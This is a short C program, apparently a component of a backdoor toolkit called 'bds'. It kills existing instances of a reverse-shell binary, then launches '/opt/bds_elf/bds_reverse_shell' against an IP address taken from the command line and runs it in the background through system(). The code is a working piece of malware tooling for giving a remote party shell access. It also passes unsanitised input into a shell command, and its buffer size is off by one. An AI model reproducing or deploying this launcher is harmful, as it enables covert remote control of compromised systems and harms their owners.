#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <fcntl.h>
#include "bds_userspace_functions.h"

int main(int argc, char *argv[]) {
	char *cmd_full = "";
	char *cmd_pre = "/opt/bds_elf/bds_reverse_shell ";
	char *ip = NULL;
	char *cmd_end = " &";
	int total = 0;
	int ret = 0;
	
	system("kill -9 31338");
	system("killall -9 bds_reverse_shell");
	ip = argv[1]; 
	total = (int)strlen(cmd_pre) + (int)strlen(ip) + (int) strlen(cmd_end);
	cmd_full = n_malloc(total);
	snprintf(cmd_full, total, "%s%s%s", cmd_pre, ip, cmd_end);
	system("killall -9 bds_reverse_shell");
	system(cmd_full);

	return 0;
}
